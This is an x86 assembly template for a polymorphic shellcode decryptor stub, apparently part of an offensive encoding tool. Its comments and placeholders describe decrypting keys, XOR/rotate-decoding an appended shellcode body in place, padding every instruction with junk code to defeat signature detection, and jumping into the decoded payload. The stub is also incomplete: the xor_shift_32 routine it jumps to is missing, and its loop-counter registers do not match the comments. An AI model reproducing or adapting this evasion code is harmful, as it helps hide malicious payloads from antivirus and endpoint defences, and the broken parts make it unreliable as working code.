.code32

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// {{.Reg.eax}} store the seed
// {{.Reg.ebx}} store the key and multiplier
// {{.Reg.ecx}} store the increment
// {{.Reg.edx}} store the loop times
// {{.Reg.ebp}} store the body address
// {{.Reg.esi}} store the swapped address about i
// {{.Reg.edi}} store the swapped address about j

entry:
  // save context
  pushad                                       {{iji}}
  pushfd                                       {{iji}}

  // load seed and key
  mov {{.Reg.eax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{iji}}

  // decrypt increment
  mov {{.Reg.ecx}}, {{hex .Imm.Inc}}           {{iji}}
  xor {{.Reg.ecx}}, {{.Reg.ebx}}               {{iji}}

  // decrypt multiplier and destroy key
  mov {{.Reg.edx}}, {{hex .Imm.Mul}}           {{iji}}
  xor {{.Reg.ebx}}, {{.Reg.edx}}               {{iji}}

  // decrypt the loop time and prevent continuous 0x00
  mov {{.Reg.edx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // check the loop time is zero
  test {{.Reg.edx}}, {{.Reg.edx}}              {{iji}}
  jz skip_unshuffle                            {{iji}}

  call calc_body_addr
 flag_CEA:                                              {{iji}}
  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{iji}}
  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{iji}}
  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{iji}}

  // decode shellcode body
 loop_xor:
  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{ijs}}
  ror {{.Reg.edi}}, 5                          {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{ijs}}
  rol {{.Reg.edi}}, 17                         {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{ijs}}
  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{ijs}}

  // call xor shift 32
  jmp xor_shift_32                             {{ijs}}
 ret_1:

  // update address and counter
  add {{.Reg.esi}}, 4                          {{ijs}}
  dec {{.Reg.ecx}}                             {{ijs}}
  jnz loop_xor                                 {{ijs}}
 skip_unshuffle:

  // restore context
  popfd                                        {{iji}}
  popad                                        {{iji}}

  jmp body                                     {{iji}}

calc_body_addr:
  pop  {{.Reg.esi}}                            {{iji}}
  push {{.Reg.esi}}                            {{iji}}
  ret                                          {{iji}}

body:
  // loader or raw shellcode
